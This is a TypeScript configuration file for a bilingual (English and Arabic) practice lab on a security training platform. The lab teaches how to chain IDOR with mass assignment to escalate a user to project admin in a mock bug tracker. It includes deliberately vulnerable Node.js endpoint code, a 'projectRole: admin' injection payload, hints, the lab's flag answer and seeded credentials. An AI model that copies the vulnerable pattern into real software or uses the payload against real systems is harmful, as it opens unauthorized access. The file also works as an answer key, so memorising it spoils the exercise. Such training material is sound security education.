// src/modules/practice-labs/idor/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const idorLab4Metadata: LabMetadata = {
  slug: 'idor-mass-assignment-bug-tracker',
  canonicalConceptId: 'idor-mass-assignment-chained',
  environmentType: 'PROJECT_MANAGEMENT',
  title: 'IDOR + Mass Assignment: Bug Tracker — Escalate to Project Admin',
  ar_title: 'IDOR + التعيين الجماعي: متتبع الأخطاء — التصعيد إلى مسؤول المشروع',
  description:
    'Chain an IDOR vulnerability with a mass assignment flaw in a bug tracker. First access private project issues via IDOR, then exploit mass assignment in the issue update endpoint to escalate your role to project admin.',
  ar_description:
    'سلسل ثغرة IDOR مع خلل في التعيين الجماعي في متتبع الأخطاء. استخدم أولاً IDOR للوصول إلى مشاكل المشروع الخاصة، ثم استغل التعيين الجماعي في endpoint تحديث المشكلة للتصعيد إلى مسؤول المشروع.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: ['IDOR', 'Mass Assignment', 'Privilege Escalation', 'Chained Vulnerabilities', 'API Security'],
  xpReward: 330,
  pointsReward: 165,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  missionBrief: {
    codename: 'OPERATION DOUBLE CHAIN',
    classification: 'TOP_SECRET',
    objective: {
      en: 'Infiltrate BugFlow project management platform. Chain IDOR with mass assignment to escalate your role from reporter to project admin and access classified project settings.',
      ar: 'تسلل إلى منصة إدارة المشاريع BugFlow. سلسل IDOR مع التعيين الجماعي لتصعيد دورك من مراسل إلى مسؤول مشروع والوصول إلى إعدادات المشروع السرية.',
    },
    successCriteria: {
      en: 'Reach POST /project/settings as admin and retrieve the flag.',
      ar: 'صل إلى POST /project/settings كمسؤول واسترجع العلم.',
    },
  },

  labInfo: {
    vulnType: 'IDOR + Mass Assignment (Chained)',
    cweId: 'CWE-915',
    cvssScore: 8.8,
    whatYouLearn: {
      en: [
        'How to chain IDOR with mass assignment for privilege escalation',
        'Why Object.assign(model, req.body) is dangerous in update endpoints',
        'How chained medium-severity vulnerabilities create critical impact',
        'Mitigation: allowlist-based DTO + object-level auth on every endpoint',
      ],
      ar: [
        'كيفية تسلسل IDOR مع التعيين الجماعي لتصعيد الصلاحيات',
        'لماذا Object.assign(model, req.body) خطير في نقاط نهاية التحديث',
        'كيف تخلق الثغرات المتسلسلة متوسطة الخطورة تأثيراً حرجاً',
        'التخفيف: DTO مبني على القائمة البيضاء + مصادقة على مستوى الكائن في كل endpoint',
      ],
    },
    techStack: ['REST API', 'Node.js', 'Bug Tracker', 'Mass Assignment'],
    references: [
      'https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html',
      'https://cwe.mitre.org/data/definitions/915.html',
    ],
  },

  goal: '1) Use IDOR to access a private project\'s issues. 2) Find an issue update endpoint that mass-assigns all body fields. 3) Inject a "projectRole: admin" field to escalate your membership. 4) Access the admin-only project settings to retrieve the flag.',
  ar_goal:
    '1) استخدم IDOR للوصول إلى مشاكل المشروع الخاصة. 2) ابحث عن endpoint تحديث المشكلة الذي يُعيّن جميع حقول الـ body. 3) احقن حقل "projectRole: admin" لتصعيد عضويتك. 4) صل إلى إعدادات المشروع الخاصة بالأدمن لاسترداد العلم.',

  briefing: {
    en: `BugFlow — project management and bug tracking. Enterprise-grade. Used by 500+ companies.
You are reporter_john. Viewer on Project ALPHA.
You can see your issues: ISS-301. Login button misaligned. Low priority.
You try ISS-302.
BETA project. Private. Another team's issue.
API rate limit not enforced.
The server gave it to you.
No membership check. No project permission.
Now you find the issue update endpoint.
POST /issues/ISS-305/update
You send: { "title": "Updated title" }
The response includes all issue fields.
Including... projectRole.
What if you send: { "title": "Updated", "projectRole": "admin" }?`,
    ar: `BugFlow — إدارة المشاريع وتتبع الأخطاء. على مستوى المؤسسات. يستخدمه أكثر من 500 شركة.
أنت reporter_john. مشاهد في مشروع ALPHA.
يمكنك رؤية مشاكلك: ISS-301.
تحاول ISS-302.
مشروع BETA. خاص. مشكلة فريق آخر.
الخادم أعطاه لك.
لا فحص عضوية. لا إذن مشروع.
تجد endpoint تحديث المشكلة.
POST /issues/ISS-305/update
ترسل: { "title": "عنوان محدَّث" }
الاستجابة تتضمن جميع حقول المشكلة.
بما فيها... projectRole.
ماذا لو أرسلت: { "title": "Updated"، "projectRole": "admin" }؟`,
  },

  stepsOverview: {
    en: [
      'Step 1 — IDOR: Access ISS-302 through ISS-305, confirm no project membership check',
      'Step 2 — Discovery: POST /issues/ISS-305/update with a normal title — observe projectRole in response',
      'Step 3 — Mass Assignment: Inject { "projectRole": "admin" } in the update body',
      'Step 4 — Escalation: Verify your role is now admin via GET /project/membership',
      'Step 5 — Flag: POST /project/settings — admin-only endpoint returns the flag',
    ],
    ar: [
      'الخطوة 1 — IDOR: صل إلى ISS-302 إلى ISS-305، أكّد غياب فحص عضوية المشروع',
      'الخطوة 2 — الاكتشاف: استدعِ POST /issues/ISS-305/update بتحديث عنوان عادي — لاحظ projectRole في الاستجابة',
      'الخطوة 3 — التعيين الجماعي: احقن { "projectRole": "admin" } في جسم التحديث',
      'الخطوة 4 — التصعيد: تحقّق أن دورك أصبح admin عبر GET /project/membership',
      'الخطوة 5 — العلم: POST /project/settings — endpoint الخاص بالأدمن يُعيد العلم',
    ],
  },

  solution: {
    context:
      'BugFlow has two chained vulnerabilities: (1) IDOR on issue fetch — no project membership check. (2) Mass Assignment on issue update — Object.assign(issue, req.body) blindly copies all request body fields including projectRole.',
    vulnerableCode:
      '// Issue fetch (IDOR):\n' +
      "app.post('/issues/:id/view', auth, async (req, res) => {\n" +
      '  const issue = await db.issues.findOne({ id: req.params.id });\n' +
      '  // ❌ No project membership check\n' +
      '  res.json(issue);\n' +
      '});\n\n' +
      '// Issue update (Mass Assignment):\n' +
      "app.post('/issues/:id/update', auth, async (req, res) => {\n" +
      '  const issue = await db.issues.findOne({ id: req.params.id });\n' +
      '  // ❌ Assigns ALL body fields including sensitive ones!\n' +
      '  Object.assign(issue, req.body);\n' +
      '  await db.issues.save(issue);\n' +
      '  res.json(issue);\n' +
      '});',
    exploitation:
      '1. POST /issues/ISS-303/view → private BETA issue returned → IDOR confirmed.\n' +
      '2. POST /issues/ISS-305/update { "title": "test", "projectRole": "admin" } → role escalated.\n' +
      '3. POST /project/settings → admin-only → flag returned.',
    steps: {
      en: [
        'POST /issues/ISS-302/view → BETA project private issue returned → IDOR confirmed',
        'POST /issues/ISS-305/update { "title": "normal update" } → response shows projectRole: "reporter"',
        'POST /issues/ISS-305/update { "title": "exploit", "projectRole": "admin" } → projectRole: "admin" escalated!',
        'POST /project/settings → flag: FLAG{IDOR_MASS_ASSIGNMENT_CHAINED_PRIVILEGE_ESCALATION}',
      ],
      ar: [
        'POST /issues/ISS-302/view → مشكلة مشروع BETA الخاصة مُعادة → تم تأكيد IDOR',
        'POST /issues/ISS-305/update { "title": "تحديث عادي" } → الاستجابة تُظهر projectRole: "reporter"',
        'POST /issues/ISS-305/update { "title": "exploit"، "projectRole": "admin" } → projectRole: "admin" تم التصعيد!',
        'POST /project/settings → العلم: FLAG{IDOR_MASS_ASSIGNMENT_CHAINED_PRIVILEGE_ESCALATION}',
      ],
    },
    fix: [
      'IDOR fix: verify project membership before returning any issue',
      'Mass Assignment fix: use explicit field allowlists — never Object.assign(model, req.body)',
      'Correct pattern: const { title, description, priority } = req.body',
      'Sensitive fields (role, permissions) must ONLY be modified through dedicated authorized endpoints',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Vulnerability chaining is a key skill for advanced penetration testing. Individually IDOR and Mass Assignment might be rated medium severity. Together they enable full privilege escalation.',
      ar: 'تسلسل الثغرات مهارة رئيسية للاختبار المتقدم. بشكل فردي IDOR والتعيين الجماعي قد يُصنَّفان خطورة متوسطة. معاً يُمكّنان من تصعيد كامل للصلاحيات.',
    },
    impact: {
      en: 'Full project admin access: read all private issues, escalate role on any project, access project secrets and settings.',
      ar: 'وصول كامل لأدمن المشروع: قراءة جميع المشاكل الخاصة، تصعيد الدور على أي مشروع، الوصول إلى أسرار وإعدادات المشروع.',
    },
    fix: [
      'Defense in depth: fix both vulnerabilities independently',
      'Object-level auth: check project membership for EVERY issue endpoint',
      'Input allowlisting: define updateIssueDto with only user-modifiable fields',
      'Security testing: include chained vulnerability scenarios in your pentest scope',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 20,
      ar_content: 'أنت مشاهد في مشروع ALPHA. مشكلتك هي ISS-301. جرّب الوصول إلى ISS-302، ISS-303 — هل تحصل على مشاكل خاصة من مشاريع أخرى؟',
      content: 'You are a viewer on Project ALPHA. Your issue ID is ISS-301. Try accessing ISS-302, ISS-303 — do you get private issues from other projects?',
    },
    {
      order: 2,
      xpCost: 40,
      ar_content: 'جرّب تحديث مشكلة عبر POST /issues/{id}/update بتغيير عنوان بسيط. انظر الاستجابة الكاملة — هل هناك حقل "projectRole"؟',
      content: 'Now try updating an issue via POST /issues/{id}/update with a simple title change. Look at the full response — is "projectRole" among the returned fields?',
    },
    {
      order: 3,
      xpCost: 60,
      ar_content: 'POST /issues/ISS-305/update مع body: { "title": "test"، "projectRole": "admin" }. تحقّق من تغيير دورك. ثم جرّب POST /project/settings.',
      content: 'POST /issues/ISS-305/update with body: { "title": "test", "projectRole": "admin" }. Check the response — did your role change? Now try POST /project/settings.',
    },
  ],

  flagAnswer: 'FLAG{IDOR_MASS_ASSIGNMENT_CHAINED_PRIVILEGE_ESCALATION}',
  initialState: {
    users: [
      { username: 'reporter_john', password: 'john123', role: 'reporter' },
      { username: 'admin_bugflow', password: 'BUG_ADM1N!', role: 'admin' },
    ],
    contents: [
      { title: 'ISS-301', body: JSON.stringify({ title: 'Login button misaligned', priority: 'low', project: 'ALPHA', isPrivate: false, projectRole: 'reporter' }), author: 'issue', isPublic: true },
      { title: 'ISS-302', body: JSON.stringify({ title: 'Search returns wrong results', priority: 'medium', project: 'BETA', isPrivate: true, projectRole: 'reporter' }), author: 'issue', isPublic: false },
      { title: 'ISS-303', body: JSON.stringify({ title: 'API rate limit not enforced', priority: 'high', project: 'GAMMA', isPrivate: true, projectRole: 'reporter' }), author: 'issue', isPublic: false },
      { title: 'ISS-304', body: JSON.stringify({ title: 'Password stored in plaintext', priority: 'critical', project: 'DELTA', isPrivate: true, projectRole: 'reporter' }), author: 'issue', isPublic: false },
      { title: 'ISS-305', body: JSON.stringify({ title: 'Admin panel accessible without 2FA', priority: 'critical', project: 'ALPHA', isPrivate: false, projectRole: 'reporter', flag: 'FLAG{IDOR_MASS_ASSIGNMENT_CHAINED_PRIVILEGE_ESCALATION}' }), author: 'issue_target', isPublic: false },
    ],
  },
};
